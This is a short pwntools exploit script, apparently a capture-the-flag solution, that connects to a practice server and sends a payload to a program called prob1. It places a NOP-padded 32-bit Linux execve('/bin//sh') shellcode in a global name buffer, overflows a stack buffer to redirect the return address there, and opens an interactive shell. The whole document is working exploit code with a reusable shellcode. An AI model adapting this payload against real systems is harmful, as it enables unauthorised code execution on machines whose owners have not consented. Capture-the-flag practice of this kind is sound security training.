#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
#p = process("./prob1")
p = remote("ctf.j0n9hyun.xyz", 3003)

name = 0x804a060

pay = '\x90'*13
pay += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
pay += '\x90'*13

p.sendafter("Name : ", pay)
p.sendafter("input : ", 'A'*0x14 + 'B'*4 + p32(name))

p.interactive()
